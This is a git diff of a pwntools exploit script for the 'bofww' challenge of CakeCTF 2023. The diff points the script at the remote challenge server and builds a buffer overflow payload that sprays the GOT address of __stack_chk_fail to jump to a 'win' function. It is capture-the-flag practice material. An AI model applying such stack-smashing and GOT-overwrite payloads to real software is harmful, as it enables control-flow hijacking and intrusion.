@@ -13,14 +13,14 @@ b main
 c
 """
 
-# p = remote("bofww.2023.cakectf.com", 9002)
+p = remote("bofww.2023.cakectf.com", 9002)
 # p = elf.process()
-p = gdb.debug(elf.file.name, gdbscript=gdbscript)
+# p = gdb.debug(elf.file.name, gdbscript=gdbscript)
 
 payload = flat(
     0x4012f6, # win address
     0,
-    p64(0x41414141)*0x30    # got _stack_check_fail spray
+    p64(elf.got['__stack_chk_fail'])*0x30    # got _stack_check_fail spray
 )
 
 p.sendlineafter(b"name? ", payload)
